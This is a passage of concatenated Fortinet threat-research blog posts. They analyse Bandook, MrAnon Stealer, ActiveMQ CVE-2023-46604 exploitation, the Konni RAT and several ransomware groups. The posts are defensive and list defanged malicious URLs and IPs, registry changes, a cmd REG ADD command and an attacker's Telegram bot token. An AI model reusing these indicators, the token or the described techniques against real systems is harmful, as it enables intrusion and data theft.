commands and actions that have complex mechanisms. @0003, @0004 This action is about file reading. If Arg3 is R, it keeps calling the Sleep function until the C2 server sends @0004 and its related arguments to Bandook. The @0004 command gives a value to determine from where to read the file or to just do nothing. Finally, Bandook sends the file specified by Arg2 to the C2 server. @0006, @0007 This action is about file writing. Similar to @0003, @0006 waits for @0007. @0007 determines how to write data from the C2 server to a local file. @0126, @0127, @0128 This action executes a Python file. The main command is @0128, which calls a ShellExecute function to run a Python file {Parent directory}\\Lib\\dpx.pyc with arguments Arg2~Arg6. The {Parent directory} is stored in the registry key pthma under HKCU\\Software. @0126 checks pthma’s value and sends the result to the server. @0127 writes its Arg2 to pthma if fcd.dll is initialized in the victim’s computer. Additionally, some commands send special data to the server: @0124 This action monitors the victim’s screen and controls the computer. When Bandook receives this command, it overwrites the config file of Firefox pref.js with code hard-coded in the payload and disables protection mechanisms in Microsoft Edge: Registry Key name Value Software\\Microsoft\\Internet Explorer TabProcGrowth 0 NoProtectedModeBanner 1 Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3 2500 3 After this, Bandook creates a virtual desktop and assigns it to a newly created thread (Thread_Control) that establishes a new communication with the C2 server. It first sends the string AVE_MARIA, followed by another packet containing the number 1, to the server. If the server responds, Bandook creates another thread to keep sending screenshots to the server. This thread also sends two packets: the string AVE_MARIA and the number 0. In the meantime, Thread_Control receives coordinates and control codes from the server. These tasks include: In addition, there are three new commands compared to the 2021 variant: @0138 This writes encrypted backup URLs to the registry key kPYXM under HKCU\\Software\\AkZhAyV0\\. When the current C2 server is unavailable, Bandook will decrypt it and try to access the URLs. The format of the decrypted data will look like this: {URL}|{URL}|{URL}| Bandook will extract URLs and try these sequentially if the previous URL is unavailable. @0139 This command asks Bandook to parse cookies from the browser specified by the C2, including Chrome, Edge, and Firefox, and save the result as Default.json in a .zip file. @0140 In the previous variant, @0140 is missing. This command asks Bandook to establish a persistence mechanism with sub_13160400, also called when the control code is GUM, as shown in Figure 9. This article unveils new details about the C2 mechanism of this long-existing malware and the new features in its latest variant. A large number of commands for C2 communication can be found in this malware. However, the tasks performed by its payload are fewer than the number in the command. This is because multiple commands are used for a single action, some commands call functions in other modules, and some are only used to respond to the server. Though the entire system is not observed in this attack, FortiGuard will continue monitoring malware variants and provide appropriate protections. The malware described in this report are detected and blocked by FortiGuard Antivirus as: PDF/Agent.1F56!trW32/Injector.EQDO!trW32/Bandok.NAT!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service.

    "title": "MrAnon Stealer Spreads via Email with Fake Hotel Booking PDF",
    "link": "https://www.fortinet.com/blog/threat-research/mranon-stealer-spreads-via-email-with-fake-hotel-booking-pdf",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The information collected can be used for future attacksSeverity Level:High FortiGuard Labs recently identified an email phishing campaign using deceptive booking information to entice victims into clicking on a malicious PDF file. The PDF downloads a .NET executable file created with PowerGUI and then runs a PowerShell script to fetch the final malware, known as MrAnon Stealer. This malware is a Python-based information stealer compressed with cx-Freeze to evade detection. MrAnon Stealer steals its victims' credentials, system information, browser sessions, and cryptocurrency extensions. Figure 1 illustrates the attack flow. The downloader URL was mostly queried in Germany, which suggests it was the primary target of the attack. The number of queries for this URL rose significantly in November 2023, implying the campaign was more active and aggressive during that month. In this article, we will detail the behavior of this malware at each stage. The attacker, masquerading as a company looking to reserve hotel rooms, sends phishing emails with the subject, “December Room Availability Query.” The body contains bogus hotel booking details for the holiday season. The attached malicious PDF file has a downloader link hidden in the stream object. Its data after decoding is shown below: Using the strings in the class “Loader,” we identified that the malware used the PowerShell script editor that converts PowerShell scripts to Microsoft executable files. Upon examination of the .NET executable file shown in Figure 6, we found that it utilizes ScriptRunner.dll to extract “Scripts.zip” to obtain a PowerShell script. The extracted file is deposited at the following location: “%USERPROFILE%\\AppData\\Local\\Temp\\Quest Software\\PowerGUI”. This .NET Microsoft Windows executable is solely tasked with unpacking an embedded script named “down2.ps1” and executing it using PowerShell.exe. The packed file and PowerShell configurations are within the resources section of the file, as illustrated in Figure 7. The script initiates the loading of a Windows Form and configures its settings, including form, label, and progress bar. Additionally, it defines text within the execution of the subsequent script to mitigate user suspicions. Within the \"Form Load event\" section, the script retrieves a payload from the identical domain, “anonbin[.]ir,” and decompresses the file in the temporary folder. It then locates the execution file within the zip archive and employs “Start-Process” for execution. A window named “File Not Supported” is displayed in this state, accompanied by a status message indicating “Not Run: python.exe.” This deceptive presentation is designed to mislead users into believing that the malware has not been executed successfully. Figure 10 illustrates the window and progress bar during the execution of the malware. The compressed file “Ads-Pro-V6-Free-Trail (1).zip” includes multiple files. Figure 11 shows the contents of the extracted folder. Within this folder, two DLL files serve as clean components to facilitate the loading of additional Python code by the “python.exe” process. Figure 12 illustrates the WinMain function in “python.exe,” clearly indicating that this is not a legitimate Python executable. Tracing the initial call reveals that the execution file originates from cx_Freeze tools. The script then searches for the directory “\\lib\\library.zip” and uses “PyObject_CallObject” to invoke the malicious Python code. Figure 15 shows the files from “library.zip.” Notably, “cstgversion__main__.pyc” stands out due to its distinct creation time compared to the legitimate files. This particular file encompasses the primary functions responsible for data theft. First, the malware verifies whether the following processes are currently running on the system and terminates them if they exist: “ArmoryQt.exe”, “Atomic Wallet.exe”, “brave.exe”, “bytecoin-gui.exe”, “chrome.exe”, “Coinomi.exe”, “Discord.exe”, “DiscordCanary.exe”, “Element.exe”, “Exodus.exe”, “firefox.exe”, “Guarda.exe”, “KeePassXC.exe”, “NordVPN.exe”, “OpenVPNConnect.exe”, “seamonkey.exe”, “Signal.exe”, “Telegram.exe”, “filezilla.exe”, “filezilla-server-gui.exe”, “keepassxc-proxy.exe”, “msedge.exe”, “nordvpn-service.exe”, “opera.exe”, “steam.exe”, “walletd.exe”, “waterfox.exe”, “yandex.exe” It then uses “ImageGrab” to capture a screenshot, saving it with the filename “Screenshot (Username ).png.” Additionally, it establishes connections with legitimate websites such as “api.ipify.org” and “geolocation-db.com/jsonp” to retrieve the system’s IP address, country name, and country code. It also gathers information from the following sources: Next, it compresses the stolen data, secures it with a password, and designates the filename as “Log (Username).zip.” The compressed file is then uploaded to a public file-sharing website using the URL “hxxps://store1[.]gofile[.]io/uploadFile.” Finally, it appends the download link and system information to a message that is sent to the attacker's Telegram channel using the bot token “6799784870:AAHEU6EUdnAjRcH8Qq0TCokNtVJSL06VmbU.” The support channel for MrAnon Stealer is shown in Figure 18. This support channel promotes its product, provides enhanced capabilities, and includes a purchase page at “hxxp[:]//anoncrypter[.]com” for all associated tools (Figure 19). The malicious actor established the website “anonbin[.]ir” earlier this year, as shown in Figure 20, and downloaded all associated files. Upon investigation, we discovered analogous packed files utilizing cx_Freeze from July. These files consistently feature Python-based stealers, identified by the shared \"HYDRA\" banner within the code, as illustrated in Figure 21. The campaign initially disseminated Cstealer in July and August but transitioned to distributing MrAnon Stealer in October and November. This pattern suggests a strategic approach involving the continued use of phishing emails to propagate a variety of Python-based stealers. In this attack, the threat attacker sends phishing emails with fake room booking details, aiming at specific regions. The malware uses PowerGUI and cx-Freeze tools to create a complex process that involves .NET executable files and PowerShell scripts. The attacker also uses tricks like false error messages to hide successful infection. The malware downloads and extracts files from a specific domain to run a harmful Python script. The script extracts clean DLL files and malware named “python.exe.” These are used to cover up the loading of the malicious payload—MrAnon Stealer. It steals data and sensitive information from several applications and then compresses and uploads the stolen data to a public file-sharing website and the threat actor’s Telegram channel.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Any OS running Apache Active MQ versions prior to 5.15.16, 5.16.7, 5.17.6, and 5.18.3Impacted Parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical This past October, Apache issued a criticaladvisoryaddressing CVE-2023-46604, a vulnerability involving the deserialization of untrusted data in Apache. On November 2, the Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2023-46604 to its known exploited list,KEV Catalog, indicating this vulnerability's high risk and impact. Fortiguard Labs also released anoutbreak alertand athreat signal reportabout the active exploitation of CVE-2023-46604, providing more details and recommendations for mitigation. Technical details and proof-of-concept (PoC) code for CVE-2023-46604 are publicly available, making it easier for attackers to exploit this vulnerability. In recent weeks, Fortiguard Labs has detected numerous threat actors exploiting CVE-2023-46604 to disseminate diverse strains of malware. Our analysis has unveiled the emergence of a newly discovered Golang-based botnet named GoTitan and a .NET program called \"PrCtrl Rat,\" equipped with remote control capabilities. Additionally, we have identified other well-known malware and tools in play. Initially developed as an advanced penetration testing tool and red teaming framework, Sliver supports various callback protocols, including DNS, TCP, and HTTP(S), streamlining egress processes. Kinsing has solidified its position in cryptojacking operations, showcasing its ability to quickly capitalize on newly discovered vulnerabilities. Meanwhile, Ddostf, with a history dating back to 2016, continues to exhibit its proficiency in executing targeted Distributed Denial of Service (DDoS) attacks. This article will detail the exploitation and provide insights into the malware associated with these recent attacks. The attacker initiates a connection to ActiveMQ through the OpenWire protocol, typically on port 61616. By transmitting a crafted packet, the attacker triggers the system to unmarshal a class under their control. This action, in turn, prompts the vulnerable server to retrieve and load a class configuration XML file from a specified remote URL, requiring the presence of a predefined XML file hosted externally. The known exploitation of this vulnerability involves leveraging the “ClassPathXmlApplicationContext” to load a malicious XML application configuration file from a network location via HTTP. Figure 1 shows the captured attacking traffic. The malicious XML file defines the arbitrary code intended to execute on the compromised machine. Attackers can set parameters like “cmd” or “bash” to achieve code execution on the remote vulnerable server (Figure 2). In the following sections, we will explain how the malware works and what it does on infected systems. GoTitan is a new botnet discovered earlier this month. It is written in the Go programming language and is downloaded from a malicious URL, “hxxp://91.92.242.14/main-linux-amd64s”. The attacker only provides binaries for x64 architectures, and the malware performs some checks before running. It also creates a file named \"c.log\" that records the execution time and program status. This file seems to be a debug log for the developer, which suggests that GoTitan is still in an early stage of development. It replicates itself as “/.mod” within the system and establishes a recurring execution by registering in the cron. It then retrieves the C2 IP address and gathers essential information about the compromised endpoint, including architecture, memory, and CPU details. Compiling all the collected data using “<==>” as separators, it transmits its collected information to the C2 server. The C2 message initiates with the hard coded string “Titan<==>”. GoTitan communicates with its C2 server by sending “\\xFE\\xFE” as a heartbeat signal and waiting for further instructions. When it receives a command, it passes it to a function named “handle_socket_func2” that determines an attack method. GoTitan supports ten different methods of launching distributed denial-of-service (DDoS) attacks: UDP, UDP HEX, TCP, TLS, RAW, HTTP GET, HTTP POST, HTTP HEAD, and HTTP PUT. Sliver, an open-source penetration testing tool developed in the Go language and available on GitHub, possesses the potential for misuse when wielded by threat actors due to its diverse features catering to each stage of penetration testing. Threat actors can leverage Sliver to compromise and control multiple targets across various platforms and architectures. The tool enables the generation of customized implants designed to elude detection, allowing for the execution of commands, file uploads and downloads, screenshot capture, and more on infected systems. When communicating with the C2 server at “91[.]92[.]240[.]41” via HTTP requests, Sliver dynamically selects decoders for C2 messages based on parameters in the URI. Additionally, Sliver supports various encoders, including Base32, Base58, Base64, English encoder, Gzip, Hex, and PNG. The encoded C2 communication in HTTP protocol is shown in Figure 8. The attacker retrieves the execution file from “hxxp://199[.]231[.]186[.]249:8000/unifo.dat” and stores it as “svc_veeam.exe”. The file 'unifo.dat' is a .Net framework program initially labeled as “prcli.exe” that was created in August and still spread via CVE-2023-46604. Figure 10 shows the PDB path and detailed information. For persistence, it adds “Security Service” with the current process into the registry “HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run.” It then starts the connection to C2 server “173[.]214[.]167[.]155.” Once the command is received from a remote server, it checks for a length of four. If not, it exits the program. It supports five commands: As of this writing, we have yet to receive any messages from the server, and the motive behind disseminating this tool remains unclear. However, once it infiltrates a user's environment, the remote server gains control over the system. Kinsing fetches the bash script from “194[.]38[.]22[.]53/acb.sh.” It serves the following purposes: The batch script used by Ddostf is retrieved from “hxxp://42[.]121[.]111[.]112:81/xml.sh.” It configures the history log with “+o” to prevent the recording of the current session. It then installs curl to download additional execution files and eliminate any traces. The executable file “tomcat” includes the recognizable string “ddos.tf” and the Base64-encoded string for “v8.ter.tf.” Its characteristics align with those of a threat actor who had targeted China in 2018. It first verifies that it has root privilege and that the process is running on the device. It then ensures that it will persist on the device by executing the command shown below. Ddostf includes a hard-coded string, “TF-Linux kernel…,” which appends either “SYN-“ or “UDP-“ in its C2 message, depending on whether the process runs with root privileges. Ddostf incorporates 13 attack methods: SYN_Flood, WZSYN_Flood, ICMP_Flood, GET_Flood, GETFT_Flood, HEAD_Flood, POST_Flood, xzcc_Flood, TCP_Flood, WZTCP_Flood, ack_Flood, WZUDP_Flood, and UDP_Flood. Additionally, it defines a function called “DNS_Flood,” which is not included in the current switch cases and is possibly intended for future enhancements. Despite the release of a patch for CVE-2023-46604 over a month ago, threat actors persist in exploiting this vulnerability to distribute malware on susceptible servers. This blog introduces newly discovered threats, including the Golang-based botnet GoTitan and the .NET program “PrCtrl Rat,” which have emerged as a consequence of this exploitation. Additionally, users should remain vigilant against ongoing exploits by Sliver, Kinsing, and Ddostf. It is crucial to prioritize system updates and patching and regularly monitor security advisories to effectively mitigate the risk of exploitation.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Remote attackers gain control of the infected systemsSeverity Level:Critical FortiGuard Labs recently identified the use of a Russian-language Word document equipped with a malicious macro in the ongoing Konni campaign. Despite the document's creation date of September, ongoing activity on the campaign's C2 server is evident in internal telemetry, as shown in Figure 1. This campaign relies on aremote access trojan (RAT)capable of extracting information and executing commands on compromised devices. Operating for several years, this campaign employs diverse strategies for initial access, payload delivery, and establishing persistence within victims' networks. In this blog, we will elaborate on the behavior of the malware at each stage. Upon opening the document, a yellow prompt bar appears, displaying “Enable Content” alongside some ambiguous Russian text (Figure 2). Upon selecting the button, a VBA script is initiated that displays an article in Russian that translates to “Western Assessments of the Progress of the Special Military Operation.” The VBA script (Figure 3) retrieves information from “OLEFormat.IconLabel” and stores it in a temporary folder under the filename “temp.zip.” After extracting the file's contents, it runs the “check.bat” script using the “vbHide” parameter, ensuring the batch script executes without presenting a command prompt window to the user. This method is valuable when a threat actor seeks to discreetly run a script in the background, avoiding user interaction or visible windows. The initial script file, named “check.bat” (Figure 4), performs several checks. Initially, it verifies the presence of a remote connection session. If detected, it directly initiates the “netpp.bat” script. The script then assesses whether the current system is running Windows 10, assigning a value of 1 to the variable “%Num%” regardless of the outcome. This variable later plays a role in selecting the UAC bypass method. This UAC setting is different from KONNI campaigns of the past that set either 4 or 1 for different operation systems. Additionally, it examines whether the system operates on a 64-bit architecture. If so, it renames the corresponding DLL files to “netpp.dll” and “wpns.dll” and removes extraneous DLL files. Finally, it executes “wpns.dll” with three parameters: “QQQQQQQ” as the targeted entry point name, “%Num%” denoting the chosen UAC bypass method, and “netpp.bat” for further action. Each DLL file in the Word document has been compressed using UPX. We will delve into the specifics using the 64-bit version files since their 32-bit counterparts have similar functionalities. Firstly, “wpns.dll” is invoked in the batch file “check.bat.” It is primarily designed for UAC bypass. In the batch file, the parameter is configured as 1, prompting the selection of the sub_180001B90 function, as illustrated in Figure 5. It initiates the process “wusa.exe,” a legitimate Windows utility responsible for installing and uninstalling Windows updates and packages. Because it is signed and trusted by the operating system, it runs with elevated privileges without triggering User Account Control (UAC) prompts. After establishing “wusa.exe,” it then duplicates its access token and proceeds to execute a specified command using “CreateProcessWithLogonW” using that token. Finally, it runs a “netpp.bat” script that inherits the elevated privileges. A segment of the code is shown in Figure 6. Figure 7 shows the content of the batch file \"netpp.bat.\" Here is a concise explanation of its functions: Initially, the program verifies several Windows API functions across various libraries, as shown in Figure 8. If it succeeds in loading those functions, the program continues; otherwise, it returns 0 and terminates. The C2 configuration stored in “netpp.ini” is encrypted using AES-CTR, and the key is derived from the service name established in the preceding step, namely, “netpp.” The first 16 bytes of “netpp.ini” are used as the Initialization Vector (IV) to decrypt and unveil the C2 server list, as seen in Figure 9. The program then adds a registry entry using the command “cmd /c REG ADD HKCU\\Console /v CodePage /t REG_DWORD /d 65001 /f” and begins gathering information from the compromised system. It uses the command “cmd /c systeminfo” to collect comprehensive details about the target system, including the operating system version, system manufacturer, available hotfixes, system uptime, and network configuration. This data is stored in a temporary file, and the program concatenates the string “rr “ with the system's time to create the file name. Following this, it executes “cmd /c makecab” to compress the file unless the temporary file has one of the following extensions: \".7z,\" \".zip,\" \".rar,\" \".cab,\" \".docx,\" or \".xlsx,\" as shown in Figure 10. Next, using the AES-CTR algorithm, it uses the filename as the key to encrypt the CAB file. The encrypted data is then uploaded to the C2 server via a POST request, employing a hardcoded HTTP syntax, as illustrated in Figure 11. Afterward, it utilizes the command \"cmd /c tasklist” to fetch a list of currently active processes on the system. This helps the threat actor understand the system's status and potentially identify implemented security measures. This data undergoes the same procedure as the earlier process and is transmitted to the C2 server. The entire C2 request is directed to “up.php” with the parameter “name=%PCNAME%,” as shown in Figure 12. Following the upload, the program removes the temporary file to eliminate traces. Next, it attempts to get a payload or command from the C2 server by dispatching an HTTP request to “dn.php” with the parameters “name=%PCNAME%” and “prefix.” The potential values for “prefix” include “cc” followed by a digit or a straightforward string “tt.” The C2 sessions are illustrated in Figure 13. Although the actual command from the C2 server remains undisclosed, we can deduce it from the assembly code within the DLL file. Upon receiving a response from the server, the system dissects the data using “#” as a delimiter, performs base64 decoding, and decrypts the information using AES. The deciphered content is then stored as a temporary file. The program then executes “cmd /c expand –R” to retrieve the payload for subsequent actions, as shown in Figure 14. Figure 15 shows the partial code of how it handles the C2 commands, which include executing a command with specific privileges, downloading a file, and uploading a particular file. This article explores an advanced toolset employed by a sophisticated threat actor within a Word document using batch scripts and DLL files. The payload incorporates a UAC bypass and encrypted communication with a C2 server, enabling the threat actor to execute privileged commands.

    "content": "FortiGuard Labs Threat Research The goal of theFortiGuard IR teamis to provide organizations with valuable insights from threat analysis to bolster their security posture. We recently conducted acomprehensive analysis of an incident involving the Rhysida ransomware group, shedding light on their operations, tactics, and impact, including a novel technique involving ESXi-based ransomware. The Rhysida group was first identified in May 2023, when they claimed their first victim. This group deploys a ransomware variant known asRhysidaand also offers it asRansomware-as-a-service (RaaS). The group has listed around 50 victims so far in 2023. The investigation conducted by the FortiGuard IR team and MDR team uncovered some of the techniques and tools used by Rhysida: The initial detection was identified by the FortiGuard MDR team. The threat actor was observed accessing systems in a victim's network and attempting to create memory dumps and gather user data. FortiEDR detected these events, allowing the MDR team to analyze them further. Following the initial detection and triage, the FortiGuard IR team was engaged to conduct a complete analysis. The threat actors abuse legitimate software such as PowerShell to gain information about users and systems within the network, PSExec to schedule tasks and make changes to registry keys to maintain persistence, AnyDesk for remote connections, and WinSCP for file transfers. The threat actors also attempt to exfiltrate data from various systems using MegaSync. The report also covers the additional malware the FortiGuard IR Team identified, along with a technique we don’t often see where the group deployed Windows and Linux binaries. Restricting Veeam access to only designated machines hindered the threat actors from gaining access to the backup files. Moreover, the prudent management of passwords for vSphere fortified the victim's defense. The Rhysida ransomware group is known to target vSphere and look for credentials, so the safeguards that the victim implemented were vital to preventing widespread ransomware of the virtual infrastructure. Staying informed on the landscape of cyber threats is critical. This analysis of the Rhysida group serves as a valuable resource for organizations. By uncovering motives and impact, theFortiGuard IR teams’ findings can guide proactive strategies. For a comprehensive understanding of our investigation into Rhysida, including a list of Fortinet protections able to safeguard your organization, look at the full intrusion analysis reporthere. incident response,ransomware FortiGuard Labs Threat Research CISO Collective CISO Collective Copyright © 2025 Fortinet, Inc.

    "title": "Ransomware Roundup – NoEscape",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-noescape",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the NoEscape ransomware. Affected platforms:Microsoft Windows, Linux, and ESXiImpacted parties:Microsoft Windows, Linux, and ESXi UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High NoEscape is a financially motivated ransomware group that emerged in May 2023. The group runs a Ransomware-as-a-Service program. The developer creates and provides necessary pre- and post-infection tools for affiliates to perform malicious activities such as compromising victims, data exfiltration, and encryptor (ransomware) deployments. The group has victimized numerous organizations across multiple industries, including government, energy, hospitals, and physicians’ clinics. The NoEscape ransomware group is believed to be related to the now-defunct Avaddon ransomware group. Information on the infection vector used by the NoEscape ransomware threat actor is not currently available. However, it is not likely to differ significantly from other ransomware groups. According to data collected through Fortinet'sFortiRecon service, the NoEscape ransomware group has targeted multiple industry verticals (Figure 1). Business services were most impacted by the ransomware, followed by the manufacturing and retail sectors. Victims of the NoEscape ransomware also include government organizations, hospitals, and medical clinics. When victim organizations are ranked according to country (Figure 2), the United States leads by a wide margin. As of November 3, 2023, the NoEscape ransomware group had last posted new victims on October 27th. Once a network has been compromised and data has been exfiltrated, the NoEscape attacker deploys and runs a file encryptor, which terminates the following services and processes: The ransomware encrypts files on the compromised systems and appends a “.[random 10-character uppercase alphabet]” extension to the affected files. The ransomware avoids encrypting the following file extensions: The NoEscape ransomware also exempts the following directories from file encryption: It then leaves a ransom note titled “HOW_TO_RECOVER_FILES.txt.” The ransom note instructs victims to visit a TOR site for further instructions. The actual ransom negotiation takes place on TOX. It also insists that the NoEscape ransomware group is financially driven and is not politically motivated. The NoEscape ransomware has variants that affect Linux and VMware ESXi. The NoEscape ransomware group owns a TOR site where victims can contact the threat actor. Stolen information and a list of victims are also posted there. Victims are instructed to visit the TOR site below and enter the unique personal ID listed on the ransom note. As of November 3, the “NoEscape” blog lists 20 active NoEscape ransomware victims. If victims do not comply with the attacker's request, another message is added to the page assigned to each victim urging action. Some of those messages are below: Fortinet customers are already protected from this malware variant through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the NoEscape ransomware samples with the following AV signatures: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP), is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning, to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation.

    "title": "Threat Predictions for 2024: Chained AI and CaaS Operations Give Attackers More “Easy” Buttons Than Ever",
    "link": "https://www.fortinet.com/blog/threat-research/2024-threat-predictions-chained-ai-and-caas-operations",
    "content": "FortiGuard Labs Threat Research With the growth of Cybercrime-as-a-Service (CaaS) operations and the advent of generative AI, threat actors have more “easy” buttons at their fingertips to assist with carrying out attacks than ever before. By relying on the growing capabilities in their respective toolboxes, adversaries will increase the sophistication of their activities. They’ll launch more targeted and stealthier hacks designed to evade robust security controls, as well as become more agile by making each tactic in the attack cycle more efficient. In our2024 threat predictions report, our FortiGuard Labs team looks at a new era of advanced cybercrime, examines how AI is changing the (attack) game, shares fresh threat trends to watch for this year and beyond, and offers advice on how organizations everywhere can enhance their collective resilience against an evolving threat landscape. We've been observing and discussing many fan-favorite attack tactics for years and covered these topicsin past reports. The \"classics\" aren't going away—instead, they're evolving and advancing as attackers gain access to new resources. For example, when it comes to advanced persistent cybercrime, we anticipate more activity among a growing number of advanced persistent threat (APT) groups. In addition to the evolution of APT operations, we predict that cybercrime groups, in general, will diversify their targets and playbooks, focusing on more sophisticated and disruptive attacks, and setting their sights on denial of service and extortion. Cybercrime \"turf wars\" continue, with multiple attack groups homing in on the same targets and deploying ransomware variants, often within 24 hours or less. In fact, we’ve observed such a rise in this type of activity that the FBIissued a warningto organizations about it earlier this year. And let’s not forget about the evolution of generative AI. This weaponization of AI is adding fuel to an already raging fire, giving attackers an easy means of enhancing many stages of their attacks. As we’ve predicted in the past, we’re seeing cybercriminals increasingly use AI to support malicious activities in new ways, ranging from thwarting the detection of social engineering tomimicking human behavior. While cybercriminals will always rely on tried-and-true tactics and techniques to achieve a quick payday, today’s attackers now have a growing number of tools available to them to assist with attack execution. As cybercrime evolves, we anticipate seeing several fresh trends emerge in 2024 and beyond. Here’s a glimpse of what we expect. Next-level playbooks:Over the past few years, ransomware attacks worldwide have skyrocketed, making every organization, regardless of size or industry, a target. Yet, as an increasing number of cybercriminals launch ransomware attacks to attain a lucrative payday, cybercrime groups are quickly exhausting smaller, easier-to-hack targets. Looking ahead, we predict attackers will take a \"go big or go home\" approach, with adversaries turning their focus to critical industries—such as healthcare, finance, transportation, and utilities—that if hacked, would have a sizeable adverse impact on society and make for a more substantial payday for the attacker. They’ll also expand their playbooks, making their activities more personal, aggressive, and destructive in nature. It's a new day for zero days:As organizations expand the number of platforms, applications, and technologies they rely on for daily business operations, cybercriminals have unique opportunities to uncover and exploit software vulnerabilities. We've observed arecord numberof zero days and new Common Vulnerabilities and Exposures (CVEs) emerge in 2023, and that count is still rising. Given how valuable zero days can be for attackers, we expect to see zero-day brokers—cybercrime groups selling zero days on the dark web to multiple buyers—emerge among the CaaS community. N-days will continue to pose significant risks for organizations as well. Playing the inside game:Many organizations are leveling up their security controls and adopting new technologies and processes to strengthen their defenses. These enhanced controls make it more difficult for attackers to infiltrate a network externally, so cybercriminals must find new ways to reach their targets. Given this shift, we predict that attackers will continue to shift left with their tactics, reconnaissance, and weaponization, with groups beginning to recruit from inside target organizations for initial access purposes. Ushering in “we the people” attacks:Looking ahead, we expect to see attackers take advantage of more geopolitical happenings and event-driven opportunities, such as the 2024 U.S. elections and the Paris 2024 games. While adversaries have always targeted major events, cybercriminals now have new tools at their disposal—generative AI in particular—to support their activities. Narrowing the TTP playing field:Attackers will inevitably continue to expand the collection of tactics, techniques, and procedures (TTPs) they use to compromise their targets. Yet defenders can gain an advantage by finding ways to disrupt those activities. While most of the day-to-day work done by cybersecurity defenders is related to blocking indicators of compromise, there's great value in taking a closer look at the TTPs attackers regularly use, which will help narrow the playing field and find potential “choke points on the chess board.” Making space for more 5G attacks:With access to an ever-increasing array of connected technologies, cybercriminals will inevitably find new opportunities for compromise. With more devices coming online every day, we anticipate that cybercriminals will take greater advantage of connected attacks in the future. A successful attack against 5G infrastructure could easily disrupt critical industries such as oil and gas, transportation, public safety, finance, and healthcare. Cybercrime impacts everyone, and the ramifications of a breach are often far-reaching. However, threat actors don't have to have the upper hand. Our security community can take many actions to better anticipate cybercriminals' next moves and disrupt their activities:collaboratingacross the public and private sectors to share threat intelligence, adopting standardized measures for incident reporting, and more. Organizations also have a vital role to play in disrupting cybercrime. This starts with creating a culture of cyber resilience—making cybersecurity everyone’s job—by implementing ongoing initiatives such as enterprisewide cybersecurity education programs and more focused activities like tabletop exercises for executives. Finding ways to shrink the cybersecurity skills gap, such as tapping intonew talent poolsto fill open roles, can help enterprises navigate the combination of overworked IT and security staff as well as the growing threat landscape. And threat sharing will only become more important in the future, as this will help enable the quick mobilization of protections. Download a copy of ourfull predictions reportfor 2024.

    "title": "Ransomware Roundup - Knight",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-knight",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Knight ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Knight is a relatively new ransomware group that arrived in August 2023. Like many attackers, the gang behind this variant employs double extortion tactics, where the Knight ransomware encrypts files on victims’ machines and exfiltrates data for extortion purposes. The predecessor of Knight, Cyclops, had multi-OS tools for Windows, Linux, and Mac OS. So, while FortiGuard Labs had only located a Windows version of the Knight ransomware at the time of our investigation, it seems likely that other versions may be on the way. According to anadvisoryby CERT Italy in early September, Knight targeted Italian organizations with phishing campaigns using emails with malicious attachments. The same was reported in early August by security researcher@felixw3000. In addition, Remcos and Qakbot malware are known to deliver the Knight ransomware to compromised machines. According to data collected through 